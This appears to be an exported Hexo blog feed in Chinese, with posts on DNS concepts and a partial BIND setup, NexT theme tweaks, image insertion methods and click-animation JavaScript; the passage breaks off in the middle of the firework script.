    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>&emsp;&emsp;DNS域名服务是把域名翻译成IP地址的软件称为域名系统，即DNS<a id="more"></a>。它是一种管理名字的方法。这种方法是：分不同的组来负责各子系统的名字。系统中的每一层叫做一个域，每个域用一个点分开。所谓域名服务器（即Domain Name Server，简称Name Server）实际上就是装有域名系统的主机。它是一种能够实现名字解析的分层结构数据库。</p>
<h3 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h3><p><strong><strong>DNS的结构分为顶级域名和一级域名</strong></strong><br>&emsp;&emsp;顶级域名是用以识别域名所属类别、应用范围、注册国家等公用信息的代码。 通用顶级域名指的是来自任何国家的任何人都可以自由使用的顶级域名，如”.COM”代表商业 实体；”.org”代表非营利性组织；”.net”代表网络服务者；专用顶级域名”.mil”代表军事机构；”.edu”代表教育机构；”.gov”代表政府机构。凡属于美国的机构，在此顶级域名下注册时，无需加注国家代码。<br><strong><strong>国家代码</strong></strong><br>&emsp;&emsp;此标准是将国家与地区的英文名称缩写为两位英文字母形成代码，如cn代表中国；hk 代表 香港；tw代表          中国台湾；us代表美国；uk代表英国等等。多数国家要求凡在域名 中加入其国家代码的，主机必须处于该国。          但也有些国家并无这方面的要求。<br><strong><strong>二级域名</strong></strong><br>&emsp;&emsp;指由域名使用者自己设计的，能够体现使用者的特殊性，并据以同其他人的域名相区别的字符串。<br><strong><strong>反向域</strong></strong><br>&emsp;&emsp;.in-addr.arpa即是把IP地址反过来写加上这个后缀，如172.16.1.1的反向域为1.1.16.172.in-addr.arpa这里的.              一个都不可以少。</p>
<h3 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h3><p><strong><strong>顶级/根域名服务器</strong></strong><br>&emsp;&emsp;根服务器可以说是管理互联网的主目录，是架构因特网所必须的基础设施。在国外，许多计算机科学家将根域名服务器称作“真理”（TRUTH），足见其重要性。换句话说——攻击整个因特网最有力、最直接，也是最致命的方法恐怕就是攻击根域名服务器了。现在全球有13台原有IPv4根服务器加25台IPv6根服务器，为建立多边、民主、透明的国际互联网治理体系打下坚实基础。中国部署了其中的4台，由1台主IPv6根服务器和3台辅根服务器组成，打破了中国过去没有根服务器的困境。<br><strong><strong>主域名服务器</strong></strong><br>&emsp;&emsp;负责维护一个区域的所有域名信息，是特定的所有信息的权威信息源，数据可以修改。<br><strong><strong>辅助域名服务器</strong></strong><br>&emsp;&emsp;当主域名服务器出现故障、关闭或负载过重时，辅助域名服务器作为主域名服务器的备份提供域名解析服务。辅助域名服务器中的区域文件中的数据是从另外的一台主域名服务器中复制过来的，是不可以修改的。<br><strong><strong>缓存域名服务器</strong></strong><br>&emsp;&emsp;从某个远程服务器取得每次域名服务器的查询回答，一旦取得一个答案就将它放在高速缓存中，以后查询相同的信息就用高速缓存中的数据回答，缓存域名服务器不是权威的域名服务器，因为它提供的信息都是间接信息。<br><strong><strong>转发域名服务器</strong></strong><br>&emsp;&emsp;负责所有非本地域名的本地查询。转发域名服务器接到查询请求后，在其缓存中查找，如找不到就将请求依次转发到指定的域名服务器，直到查找到结果为止，否则返回无法映射的结果。</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>&emsp;&emsp;之所以域名解析不需要很长时间，是因为上网接入商，比如北京电信，河南电信等，为了要加速用户打开网页的速度，通常在他们的DNS服务器中缓存了很多域名的DNS记录。这样这个接入商的用户要打开某个网页时，接入商的服务器不需要去查询域名数据库，而是把自己缓存中的DNS记录直接使用，从而加快用户访问网站的速度。</p>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>&emsp;&emsp;上网接入商ISP的缓存会存储一段时间，只在需要的时候才更新，而更新的频率没有什么标准。有的ISP可能1小时更新一次，有的可能长达一两天才更新一次。所以新注册的域名一般来说解析反倒比较快。因为所有的ISP都没有缓存，用户访问时ISP都是要查询域名数据库，得到最新的DNS数据。而老域名如果更改了DNS记录，但世界各地的ISP缓存数据却并不是立即更新的。这样不同ISP下的不同用户，有的可以比较快的获取新的DNS记录，有的就要等ISP缓存的下一次更新。</p>
<h2 id="DNS-1"><a href="#DNS-1" class="headerlink" title="DNS"></a>DNS</h2><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>&emsp;&emsp;网络客户端就是我们平常使用的电脑，打开浏览器，输入一个域名。比如输入<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>. 这时，你使用的电脑会发出一个DNS请求到本地DNS服务器。本地DNS服务器一般都是你的网络接入服务器商提供，比如中国电信，中国移动。查询<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果。如果没有，本地DNS服务器还要向DNS根服务器进行查询。根DNS服务器没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。本地DNS服务器继续向域服务器发出请求，在这个例子中，请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址。最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</p>
<p>可以看这个：<a href="https://juejin.im/post/5b0a32a36fb9a07ab979f0b4来源：掘金" target="_blank" rel="noopener">https://juejin.im/post/5b0a32a36fb9a07ab979f0b4来源：掘金</a></p>
<h3 id="记录类型及DNS数据库文件格式"><a href="#记录类型及DNS数据库文件格式" class="headerlink" title="记录类型及DNS数据库文件格式"></a>记录类型及DNS数据库文件格式</h3><p>DNS数据库文件是一个文本文件，只能包含资源记录或宏定义<br><strong><strong>资源记录的格式：</strong></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name          [ttl]            IN              rrtype                  value</span><br></pre></td></tr></table></figure>
<p>例如，<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  假如他的IP为192.168.0.0<br>那么它的格式应该写为以下这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name              [ttl]             IN               rrtype                 value</span><br><span class="line">www.baidu.com.     200         	    IN                 A                    192.168.0.0</span><br></pre></td></tr></table></figure>
<p>com后面的点不可少省，[ttl]的时间单位是秒可以省略不写，<br>IN是关键是这个不变，rrtype是记录文件类型,value是值。<br>SOA是区域数据为文件的第一条记录只能有一个<br>name:区域名称，如badu.com.通常可以简写为@<br>value:主DNS的</p>
<h3 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h3><p>A（Address)记录是用来指定主机名（或域名）对应的IP地址记录。就是服务器的IP，域名绑定，就是告诉DNS当你输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。简单的说，A记录是指定域名对应的IP地址。</p>
<h3 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h3><p>NS（Name Server)记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。您注册域名时，总有默认的DNS服务器，每一个注册的域名都是一个DNS服务器来进行解析的。</p>
<h3 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h3><p>MX（Mail Exchanger)记录是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。</p>
<h3 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h3><p>CNAME(canonical Name)别名记录，允许您将多个名字映射到同一台计算机。通常用于同时提供www和mail服务的计算机。</p>
<h3 id="TXT记录-TTL值"><a href="#TXT记录-TTL值" class="headerlink" title="TXT记录/TTL值"></a>TXT记录/TTL值</h3><p><strong><strong>TXT记录</strong></strong><br>TXT记录，一般指某个主机名或域名的说明，多数指管理员的邮箱地址。<br><strong><strong>TTL值</strong></strong><br>TTL(Time-To-Live):是IP协议包中的一个值，它告诉网络路由器包在网络中的时间是否太长而被丢弃。有很多原因使包在一定时间内不能被传递到目的地。就是一条域名解析记录在DNS服务器中的存留时间。当各地的DNS服务器接受到解析请求时，就会向域名指定的NS服务器发出解析请求从而获得解析记录；在获得这个记录后，记录会在DNS服务器中保存一段时间，这段时间内如时果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录，而这个记录在DNS服务器上保留的时间，就是TTL值。</p>
<h3 id="PTR值"><a href="#PTR值" class="headerlink" title="PTR值"></a>PTR值</h3><p>PTR用一个IP地址映射到对应的域名，也就是A记录的反向，就是IP地址反向解析。</p>
<h3 id="DNS数据库的记录：正解、反解、Zone的意义"><a href="#DNS数据库的记录：正解、反解、Zone的意义" class="headerlink" title="DNS数据库的记录：正解、反解、Zone的意义"></a>DNS数据库的记录：正解、反解、Zone的意义</h3><p>主机名（FQDN)的查询到IP的流程为：正解。<br>从IP到主机名(FQDN)的查询的流程为：反解。<br>不管是正解还是反解，每个域的记录就是一个域（Zone),也叫做地址池。<br><strong><strong>正解文件资源记录（Resource Rrcord,RR)格式：</strong></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[domain]          [ttl]        IN       [RR type]     [RR data]</span><br><span class="line">[待查数据]   [暂存时间（秒）]    IN       [资源类型]     [资源内容]</span><br></pre></td></tr></table></figure>
<p>一般ttl是可以省略的<br><strong><strong>常见的正解文件记录格式如下：</strong></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[domai]           IN          [RR type]           [RR data]</span><br><span class="line"></span><br><span class="line">主机名.           IN           A                   IPV4的IP地址</span><br><span class="line"></span><br><span class="line">主机名.           IN           AAAA                IPV6的IP地址</span><br><span class="line"></span><br><span class="line">域名.             IN           NS                  服务器主机的名子</span><br><span class="line"></span><br><span class="line">域名.             IN           SOA                 管理这个域名的重要参数</span><br><span class="line"></span><br><span class="line">域名.             IN           MX         优先级    接收邮件的服务器主机名子</span><br><span class="line"></span><br><span class="line">主机别名.         IN           CNAME               实际代表这个主机别名的主机名字</span><br></pre></td></tr></table></figure>
<p><strong><strong>RR type的解释</strong></strong></p>
<ol>
<li>A　AAAA：        查询IP的记</li>
<li>NS：            查询管理区域名的服务器主机</li>
<li>SOA：            查询管理域名的服务器管理信</li>
<li>CNAME：        设置某主机的别</li>
<li>MX：            查询某域名的邮件服务器主机名</li>
</ol>
<p><strong><strong>反解文件记录的RR数</strong></strong><br>   反解的Zone必须把IP反过来写，而在结尾加上.in-addr.arpa<br>   PRT就是反解，即是查询IP反对应的主机名。</p>
<h2 id="虚拟机搭建本地dns"><a href="#虚拟机搭建本地dns" class="headerlink" title="虚拟机搭建本地dns"></a>虚拟机搭建本地dns</h2><h3 id="软件：bind"><a href="#软件：bind" class="headerlink" title="软件：bind"></a>软件：bind</h3><p>BIND是在互联网上使用最广泛的域名系统‘DNS软件’。在类似Unix的操作系统上充当一个或多个特定域的权威名称服务器，并充当DNS系统的递归解析器。&gt;&gt;&gt;参见<a href="https://en.wikipedia.org/wiki/BIND" target="_blank" rel="noopener">Wiki</a><br>在RHEL6.5中，系统光盘自带了BIND服务的安装文件<br><strong><strong>各软件包的主要作用：</strong></strong><br>bind：提供了域名服务的主要程序及相关文件<br>bind-utils：提供了对DNS服务器的测试工具，如nslookup等<br>bind-libs：提供了bind、bind-utils需要使用的函数库<br>bind-chroot：提供一个伪装根目录(将/var/named/chroot/作为BIND的根目录),提高安全性</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong><strong>默认已安装bind-utils和bind-libs</strong></strong><br>插入系统光盘，挂载，安装完毕后，会自动增加一个名为named的系统服务：</p>
<pre><code># mount  /dev/cdrom  /media/                        

# rpm -ivh /media/Packages/bind-9.8.2* * * .rpm     

# rpm -ivh /media/Packages/bind-chroot-9.8.2* * * .rpm

# service  named  start                                </code></pre><p><strong><strong>手动安装</strong></strong><br>yum install安装就这问题也没搞定，</p>
<img src="/2020/03/18/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/error.png" class="" title="the error">
<p>ping 8.8.8.8没通，原来自己的dns都有问题···<br>于是&gt;&gt;&gt;</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>待</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>待</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>实验？</tag>
      </tags>
  </entry>
  <entry>
    <title>结束语</title>
    <url>/2020/03/11/%E7%BB%93%E6%9D%9F%E8%AF%AD/</url>
    <content><![CDATA[<p>在文章结尾添加本文结束标志，在<code>\themes\next\layout\_macro</code>中新建<code>passage-end-tag.swig</code>文件,并复制下列代码：</p>
<a id="more"></a>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>============本文结束( ´◔ ‸◔`)感谢您的阅读============<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改文件<br>打开<code>\themes\next\layout\_macro\post.swig</code>，在<code>post-body</code>之后，<code>post-footer</code>之前添加下列代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include 'passage-end-tag.swig' %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改主题文件<br>打开主题配置文件<code>_config.yml</code>,并在末尾添加：</p>
<h1 id="文章末尾添加“本文结束”标记"><a href="#文章末尾添加“本文结束”标记" class="headerlink" title="文章末尾添加“本文结束”标记"></a>文章末尾添加“本文结束”标记</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passage_end_tag:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>图片</title>
    <url>/2020/03/11/%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h2 id="在文章插入图片"><a href="#在文章插入图片" class="headerlink" title="在文章插入图片"></a>在文章插入图片</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>将图片统一放在<code>next/source/images</code>文件夹通过markdown语法访问它们,图片既可以在首页内容中访问到，也可以在文章正文中访问到。</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![](&#x2F;images&#x2F;image.jpg)</span><br></pre></td></tr></table></figure>
<h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>将<code>_config.yml</code>文件中的配置项<code>post_asset_folder</code>设为true<br>执行命令<code>$ hexo new post_name</code><br>在<code>source/_ posts</code>中会生成文章<code>post_name.md</code>和同名文件夹<code>post_name</code><br>将图片资源放在<code>post_name</code>中，文章就可以使用相对路径引用图片资源了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![](image.jpg)</span><br></pre></td></tr></table></figure>
<h3 id="标签插件语法引用"><a href="#标签插件语法引用" class="headerlink" title="标签插件语法引用"></a>标签插件语法引用</h3><p>相对路径的图片显示方法在博文详情页面显示没有问题，但是在首页预览页面图片将显示不出来。如果希望图片在文章和首页中同时显示，可以使用标签插件语法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 本地图片资源，不限制图片尺寸</span><br><span class="line">&#123;% asset_img image.jpg This is an image %&#125;</span><br><span class="line"># 网络图片资源，限制图片显示尺寸</span><br><span class="line">&#123;% img http:&#x2F;&#x2F;www.viemu.com&#x2F;vi-vim-cheat-sheet.gif 200 400 vi-vim-cheat-sheet %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="HTMl语法引用"><a href="#HTMl语法引用" class="headerlink" title="HTMl语法引用"></a>HTMl语法引用</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"SpellCheck.png"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">height</span>=<span class="string">"50%"</span> <span class="attr">title</span>=<span class="string">"拼写检查工具Grammarly."</span> <span class="attr">alt</span>=<span class="string">"拼写检查工具Grammarly."</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接将<code>![](image.jpg)</code>替换上面的语法</p>
<h3 id="fancybox：点击查看大图"><a href="#fancybox：点击查看大图" class="headerlink" title="fancybox：点击查看大图"></a>fancybox：点击查看大图</h3><p><a href="https://github.com/theme-next/theme-next-fancybox3" target="_blank" rel="noopener">NexT主题中提供了fancybox的方便接口</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% img http:&#x2F;&#x2F;www.viemu.com&#x2F;vi-vim-cheat-sheet.gif 600 600 &quot;点击查看大图:vi&#x2F;vim-cheat-sheet&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p><strong><strong>Hexo部分图片禁用fancybox</strong></strong><br>hexo在使用fancybox插件时，图片的效果还是很可观的，<br>但是我们往往是不需要所有的图片都用fancybox；<br>例如：hexo next主题下，添加某些图片的时候，有些事不需要可点击的<br>修改<code>theme\next\source\js\src\utils.js</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff --git a&#x2F;source&#x2F;js&#x2F;src&#x2F;utils.js b&#x2F;source&#x2F;js&#x2F;src&#x2F;utils.js</span><br><span class="line">index 0f3704e..8516665 100644</span><br><span class="line">--- a&#x2F;source&#x2F;js&#x2F;src&#x2F;utils.js</span><br><span class="line">+++ b&#x2F;source&#x2F;js&#x2F;src&#x2F;utils.js</span><br><span class="line">@@ -11,6 +11,7 @@ NexT.utils &#x3D; NexT.$u &#x3D; &#123;</span><br><span class="line">       .not(&#39;.group-picture img, .post-gallery img&#39;)</span><br><span class="line">       .each(function() &#123;</span><br><span class="line">         var $image &#x3D; $(this);</span><br><span class="line">+        if ($(this).hasClass(&#39;nofancybox&#39;)) return;</span><br><span class="line">         var imageTitle &#x3D; $image.attr(&#39;title&#39;);</span><br><span class="line">         var $imageWrapLink &#x3D; $image.parent(&#39;a&#39;);</span><br></pre></td></tr></table></figure>
<p>在img标签使用的时候加上class=”nofancybox”即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://xxx.xxx.com/xxx.gif"</span> <span class="attr">class</span>=<span class="string">"nofancybox"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>只在需要的时候加载图片，而不是一次性加载完成，加快速度，适用于图片较多的博客</p>
<p><strong><strong>安装</strong></strong><br>在博客根目录执行命令安装插件</p>
<!-- more -->
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-lazyload --save</span><br></pre></td></tr></table></figure>
<p><strong><strong>配置</strong></strong><br>在博客根目录的配置文件<code>_config.yml</code>中添加下列代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> <span class="comment">#是否只在文章中开启懒加载</span></span><br><span class="line">  <span class="comment"># className: #可选 e.g. .J-lazyload-img</span></span><br><span class="line">  <span class="comment"># loadingImg: #可选 eg. ./images/loading.png 作为图片未加载时的替代图片</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>鼠标点击特效</title>
    <url>/2020/03/08/%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88/</url>
    <content><![CDATA[<h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>&emsp;&emsp;在网页中加入鼠标点击特效，目前有心形和爆炸两种特效，两者可以叠加，特效对性能较低的设备非常不友好，尤其是爆炸特效要卡成PPT……</p>
<a id="more"></a>
<p><strong><strong>心形特效</strong></strong><br>创建js文件<br>在./themes/next/source/js中新建clicklove.js，并将粘贴下列代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(e,t,a)&#123;<span class="keyword">function</span> <span class="function"><span class="title">n</span></span>()&#123;c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()&#125;<span class="keyword">function</span> <span class="function"><span class="title">r</span></span>()&#123;<span class="keyword">for</span>(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);requestAnimationFrame(r)&#125;<span class="keyword">function</span> <span class="function"><span class="title">o</span></span>()&#123;var t=<span class="string">"function"</span>==typeof e.onclick&amp;&amp;e.onclick;e.onclick=<span class="keyword">function</span>(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="keyword">function</span> i(e)&#123;var a=t.createElement(<span class="string">"div"</span>);a.className=<span class="string">"heart"</span>,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;<span class="keyword">function</span> c(e)&#123;var a=t.createElement(<span class="string">"style"</span>);a.type=<span class="string">"text/css"</span>;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[0].appendChild(a)&#125;<span class="keyword">function</span> <span class="function"><span class="title">s</span></span>()&#123;<span class="built_in">return</span><span class="string">"rgb("</span>+~~(255*Math.random())+<span class="string">","</span>+~~(255*Math.random())+<span class="string">","</span>+~~(255*Math.random())+<span class="string">")"</span>&#125;var d=[];e.requestAnimationFrame=<span class="function"><span class="title">function</span></span>()&#123;<span class="built_in">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="keyword">function</span>(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br></pre></td></tr></table></figure>

<p>修改layout文件<br>打开<code>./themes/next/layout/_layout.swig</code>并在末尾添加以下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 页面点击心形 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/clicklove.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong><strong>爆炸特效</strong></strong><br>创建js文件<br>在<code>./themes/next/source/js</code>中新建firework.js，并将粘贴下列代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">"use strict"</span>;<span class="keyword">function</span> updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="keyword">function</span> setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;<span class="built_in">return</span>&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;<span class="keyword">function</span> createParticule(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="keyword">function</span> createCircle(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;<span class="keyword">function</span> renderParticule(e)&#123;<span class="keyword">for</span>(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="keyword">function</span> animateParticules(e,t)&#123;<span class="keyword">for</span>(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.x&#125;,y:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:<span class="string">"linear"</span>,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule,offset:0&#125;)&#125;<span class="keyword">function</span> debounce(e,t)&#123;var a;<span class="built_in">return</span> <span class="function"><span class="title">function</span></span>()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(<span class="function"><span class="title">function</span></span>()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=30,pointerX=0,pointerY=0,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="title">function</span></span>()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=window.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:<span class="function"><span class="title">function</span></span>()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,<span class="keyword">function</span>(e)&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!1)&#125;<span class="string">"use strict"</span>;<span class="keyword">function</span> updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="keyword">function</span> setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;<span class="built_in">return</span>&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;<span class="keyword">function</span> createParticule(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="keyword">function</span> createCircle(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=<span class="function"><span 